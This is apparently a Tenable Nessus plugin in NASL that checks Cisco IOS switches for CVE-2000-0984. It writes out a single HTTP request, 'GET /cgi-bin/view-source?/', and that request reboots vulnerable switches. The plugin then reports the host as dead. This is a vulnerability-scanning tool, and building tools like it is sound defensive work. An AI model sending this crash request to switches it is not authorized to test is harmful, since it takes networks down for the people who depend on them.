#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10682);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0984");
 script_bugtraq_id(1838);
 script_xref(name:"OSVDB", value:"6717");
 
 script_name(english:"Cisco IOS HTTP Server ?/ String Local DoS");
 script_summary(english:"crashes the remote switch");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote switch has a denial of service vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to make the remote switch reboot by requesting :\n\n",
     "  GET /cgi-bin/view-source?/\n\n",
     "A remote attacker may use this flaw to prevent your network from\n",
     "working properly."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.cisco.com/en/US/products/products_security_advisory09186a00800b13b6.shtml"
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "Upgrade to the latest version of IOS, or implement one of the\n",
     "workarounds listed in Cisco's advisory."
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CISCO");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if ( report_paranoia < 2 ) exit(0);
os = get_kb_item("Host/OS");
if ( os && "IOS" >!< os ) exit(0);

port = get_http_port(default:80);

start_denial();
r = http_send_recv3(method: "GET", item:string("/cgi-bin/view-source?/"), port:port);

  alive = end_denial();
  if(!alive)
  {
   security_hole(port);
   set_kb_item(name:"Host/dead", value:TRUE);
  }

